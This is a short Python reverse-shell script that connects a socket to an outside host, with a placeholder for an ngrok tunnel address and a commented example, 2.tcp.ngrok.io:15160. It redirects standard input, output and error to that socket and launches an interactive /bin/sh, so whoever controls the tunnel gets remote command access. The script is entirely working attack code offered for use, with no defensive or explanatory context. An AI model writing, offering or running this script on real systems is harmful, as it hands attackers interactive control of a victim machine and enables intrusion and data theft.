import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("NGROK URL",80));os.dup2(s.fileno(),0)
#paste above ngrok url & port eg: 
#s.connect(("2.tcp.ngrok.io",15160));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
